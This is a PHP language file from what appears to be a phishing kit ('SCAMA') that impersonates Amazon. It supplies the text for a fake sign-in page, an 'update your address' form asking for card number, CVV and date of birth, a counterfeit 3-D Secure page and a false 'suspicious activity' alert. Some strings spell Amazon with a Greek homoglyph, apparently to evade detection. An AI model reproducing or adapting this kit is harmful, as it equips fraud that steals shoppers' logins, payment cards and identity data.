<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
/*---------------------------------- LOGIN LANG -------------------------------------*/
$_LANG['TITLEPAGE'] = "Amazon Sign In";
$_LANG['NEW'] = "New to Amazon?";
$_LANG['SIGNUP'] = "Create your Amazon account";
$_LANG['TITLESIGNIN1'] = "Sign in";
$_LANG['TITLESIGNIN2'] = "Email (phone for mobile accounts)";
$_LANG['TITLEFAIL'] = "Enter your email or mobile phone number";
$_LANG['CONTINUE'] = "Continue";
$_LANG['HELP'] = "Need help?";
$_LANG['FORGOT'] = "Forgot your password?";
$_LANG['OTHER'] = "Other issues with sign in";
$_LANG['CHANGE'] = "Change";
$_LANG['TITLEPASSWORD'] = "Password";
$_LANG['PASSWORD'] = "Enter your password"; 
$_LANG['TITLEKEEP'] = "Keep me signed in.";
$_LANG['CHECKKEEP'] = "Checkbox";
$_LANG['NOTICEKEEP'] = "Keep me signed in";
$_LANG['NOTICEKEEP1'] = "Choosing \&quot;Keep me signed in\&quot; reduces the number of times you're asked to sign in on this device.";
$_LANG['NOTICEKEEP2'] = "To keep your account secure,";
$_LANG['NOTICEKEEP3'] = "use this option only on your personal devices.";
$_LANG['DETAIL'] = "Details";
$_LANG['FOOT'] = "Conditions of Use";
$_LANG['FOOT1'] = "Privacy Notice";
$_LANG['FOOT2'] = "Help";
$_LANG['FOOT3'] = "© 1996-<script>document.write(new Date().getFullYear());</script>, Αmazon.com, Inc. or its affiliates";
$_LANG['FOOT4'] = "Interest-Based Ads";
$_LANG['FOOT5'] = "Back to top";
$_LANG['FOOT6'] = "Get to Know Us";
$_LANG['FOOT7'] = "Careers";
$_LANG['FOOT8'] = "Blog";
$_LANG['FOOT9'] = "About Amazon";
$_LANG['FOOT10'] = "Investor Relations";
$_LANG['FOOT11'] = "Amazon Devices";
$_LANG['FOOT12'] = "Make Money with Us";
$_LANG['FOOT13'] = "Sell on Amazon";
$_LANG['FOOT14'] = "Sell Your Services on Amazon";
$_LANG['FOOT15'] = "Sell on Amazon Business";
$_LANG['FOOT16'] = "Sell Your Apps on Amazon";
$_LANG['FOOT17'] = "Become an Affiliate";
$_LANG['FOOT18'] = "Advertise Your Products";
$_LANG['FOOT19'] = "Self-Publish with Us";
$_LANG['FOOT20'] = "See all";
$_LANG['FOOT21'] = "Amazon Payment Products";
$_LANG['FOOT22'] = "Amazon Rewards Visa Signature Cards";
$_LANG['FOOT23'] = "Amazon.com Store Card";
$_LANG['FOOT24'] = "Amazon.com Corporate Credit Line";
$_LANG['FOOT25'] = "Shop with Points";
$_LANG['FOOT26'] = "Credit Card Marketplace";
$_LANG['FOOT27'] = "Reload Your Balance";
$_LANG['FOOT28'] = "Amazon Currency Converter";
$_LANG['FOOT29'] = "Let Us Help You";
$_LANG['FOOT30'] = "Your Account";
$_LANG['FOOT31'] = "Your Orders";
$_LANG['FOOT32'] = "Shipping Rates & Policies";
$_LANG['FOOT33'] = "Amazon Prime";
$_LANG['FOOT34'] = "Returns & Replacements";
$_LANG['FOOT35'] = "Manage Your Content and Devices";
/*---------------------------------- LOGIN ALERT -------------------------------------*/
$_LANG['TITLEALERT'] = "There was a problem";
$_LANG['ALERT'] = "Please provide your email-address or mobile phone number";
$_LANG['ALERT1'] = "Invalid email address or mobile phone number";
$_LANG['ALERT2'] = "Please enter your password";
$_LANG['ALERT3'] = "Enter the characters as they are given in the challenge.";
/*---------------------------------- UPDATE ALERT -------------------------------------*/
$_LANG['UPALERT'] = "Please Enter a valid address line";
$_LANG['UPALERT1'] = "Please Enter a valid city name";
$_LANG['UPALERT2'] = "Please Enter a valid State/Province/Region name";
$_LANG['UPALERT3'] = "Please Enter a valid ZIP code";
$_LANG['UPALERT4'] = "Please Enter a valid Phone number";
$_LANG['UPALERT5'] = "Please Enter a valid Date of Birth";
$_LANG['UPALERT6'] = "Please Enter a valid name";
$_LANG['UPALERT7'] = "Please Enter a valid Card Number";
$_LANG['UPALERT8'] = "Please Enter a valid Card Security Code";
$_LANG['UPALERT9'] = "CVV/CVV2";
/*---------------------------------- HEADER UPDATE ACCOUNT -------------------------------------*/
$_LANG['TITLEHEAD'] = "Your Αmazon Wallet";
$_LANG['HEAD'] = "Try Prime";
$_LANG['HEAD1'] = "Account & Lists";
$_LANG['HEAD2'] = "Orders";
$_LANG['HEAD3'] = "Cart";
$_LANG['HEAD4'] = "Browsing History";
$_LANG['HEAD5'] = "Amazon News";
$_LANG['HEAD6'] = "Today's Deals";
$_LANG['HEAD7'] = "Gift Cards";
$_LANG['HEAD8'] = "Disability Customer Support";
$_LANG['HEAD9'] = "Your Account";
$_LANG['HEAD10'] = "Your Address";
$_LANG['HEAD11'] = "Edit Address";
$_LANG['HEAD12'] = "Edit your address";
$_LANG['HEAD13'] = "Search";
$_LANG['HEAD14'] = "Treasure Truck";
$_LANG['HEAD15'] = "Help";
/*---------------------------------- HEADER UPDATE ACCOUNT -------------------------------------*/
$_LANG['TITLEHEADUP'] = "Add or Confirm an address";
$_LANG['HEADUP'] = "Enter your personal informations";
$_LANG['HEADUP1'] = "(Step 1 of 2)";
$_LANG['HEADUP2'] = "JavaScript Required";
$_LANG['HEADUP3'] = "Please enable JavaScript to use this page";
/*---------------------------------- FORM UPDATE ACCOUNT -------------------------------------*/
$_LANG['TITLEUP'] = "Update Your Address";
$_LANG['FRMUP'] = "Full name";
$_LANG['FRMUP1'] = "Street address";
$_LANG['FRMUP2'] = "City";
$_LANG['FRMUP3'] = "State / Province / Region";
$_LANG['FRMUP4'] = "Zip Code";
$_LANG['FRMUP5'] = "Phone number";
$_LANG['FRMUP6'] = "Add or Confirm a Credit/Debit Card";
$_LANG['FRMUP7'] = "Name on card";
$_LANG['FRMUP8'] = "Card Number";
$_LANG['FRMUP9'] = "Expiration date";
$_LANG['FRMUP10'] = "Card Security Code";
$_LANG['FRMUP11'] = "May be used to assist delivery";
$_LANG['FRMUP12'] = "Αmazon accepts all major credit & debit cards.";
$_LANG['COUNTRY'] = "Country";
$_LANG['DOB'] = "Date of Birth";
$_LANG['TITLEADDRESS1'] = "Address line 1";
$_LANG['TITLEADDRESS2'] = "Address line 2";
$_LANG['ADDRESS1'] = "Street and number, P.O. box, c/o.";
$_LANG['ADDRESS2'] = "Apartment, suite, unit, building, floor, etc.";
$_LANG['TERMS'] = "Αmazon Update Terms ";
$_LANG['TERMS1'] = "By clicking Save & Continue, you agree to Αmazon.";
$_LANG['TERMS2'] = "'s privacy notice and conditions of use. ";
$_LANG['SAVE'] = "Save & Continue";
/*---------------------------------- VBV/MSC CREDIT CARD -------------------------------------*/
$_LANG['TITLEVBVMSC'] = "3-D Security Auth";
$_LANG['VBVMSCPROCESS'] = "3-D Security has been successfully processed...";
$_LANG['VBVMSCLOAD'] = "Processing";
$_LANG['VBVMSCSAFE'] = "Added Safety Online";
$_LANG['VBVMSCAUTH1'] = "helps protect your card against unauthorized use online - at no additional cost.";
$_LANG['VBVMSCAUTH2'] = "To use on this and futur purshases.";
$_LANG['VBVMSCAUTH3'] = "complete this page You'll the create your own.";
$_LANG['VBVMSCNAME'] = "Name on card :";
$_LANG['VBVMSCCOUNTRY'] = "Country :";
$_LANG['VBVMSCTYPE'] = "Card Type :";
$_LANG['VBVMSCNUMBER'] = "Card Number :";
$_LANG['VBVMSCDATE'] = "Date time :";
$_LANG['VBVMSCDOB'] = "Birth Date :";
$_LANG['PENCET'] = "Submit";
$_LANG['CANNOT'] = "Cannot access your";
$_LANG['AMAZONCONTACT'] = "Contact";
$_LANG['AMAZONCS'] = "Amazon Customer Service";
$_LANG['AMAZONASS'] = "Amazon Assistant";
/*---------------------------------- NOTICE UPDATE ACCOUNT -------------------------------------*/
$_LANG['NOTIUP'] = "By clicking Agree & Continue, I have read and agree to Amazon’s";
$_LANG['NOTIUP1'] = "User Agreement";
$_LANG['NOTIUP2'] = "Electronic Communications Update Policy";
$_LANG['NOTIUP3'] = "Αgree & Continue";
/*---------------------------------- LANGUAGE -------------------------------------*/
$_LANG['BAHASA1'] = "EN";
$_LANG['BAHASA2'] = "English";
/*---------------------------------- MAKASIH -------------------------------------*/
$_LANG['MAKASIH'] = "Thank You";
$_LANG['MAKASIH1'] = "You have successfully confirmed your account information.";
/*---------------------------------- NOTICE MAKASIH -------------------------------------*/
$_LANG['NOTICEMAKASIH'] = "Thank you,
                        You have successfully confirmed your account information.   ";
$_LANG['NOTICEMAKASIH1'] = "Please check your email for further instructions and detailed information about your update. If you did not register your email address, please visit <a href='#/gp/message'>Message Center</a> to review your update notifications.";
$_LANG['NOTICEMAKASIH2'] = "Get update notifications on your mobile device with the free <a href='#/typapp'>Amazon app</a>.";
$_LANG['NOTICEMAKASIH3'] = "Turn on 1-Click update";
$_LANG['NOTICEID'] = "Update ID:";
$_LANG['NOTICEID1'] = "Review or edit your account";
$_LANG['NOTICESHOP'] = "Continue shopping";
/*---------------------------------- AKTIVASI -------------------------------------*/
$_LANG['AKTIF'] = "Confirm & Activate";
/*---------------------------------- NOTICE ACTIVITY -------------------------------------*/
$_LANG['LOGINALERT'] = "Amazon suspicious activity detected";
$_LANG['LOGINALERT1'] = "Suspicious Activities";
$_LANG['LOGINALERT2'] = "It seems that one or more unauthorized devices are connected to your account and add security with phone number: +1 (8 **) *** 2740.";
$_LANG['LOGINALERT3'] = "Start Verification Now";
?>